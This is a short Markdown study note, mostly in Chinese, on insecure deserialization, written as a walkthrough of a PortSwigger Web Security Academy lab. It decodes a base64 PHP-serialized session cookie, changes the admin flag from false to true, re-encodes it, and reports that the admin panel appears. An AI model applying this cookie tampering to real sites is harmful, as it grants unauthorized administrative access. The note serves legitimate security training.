---
title: Insecure deserialization
description: Insecure deserialization
---

## PHP serialization format

https://portswigger.net/web-security/deserialization/exploiting#php-serialization-format

## Java serialization format

https://portswigger.net/web-security/deserialization/exploiting#java-serialization-format

## Lab: Modifying serialized objects

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#modifying-object-attributes                      |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects |

登入後，看到 Cookie `session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=` (URL Decoded 版本)

```js
atob(
  "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=",
);
// O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

嘗試構造

```js
btoa(`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```

塞回 Cookie.session，重整網頁，即可看到 Admin Panel～

## 參考資料

- https://portswigger.net/web-security/deserialization
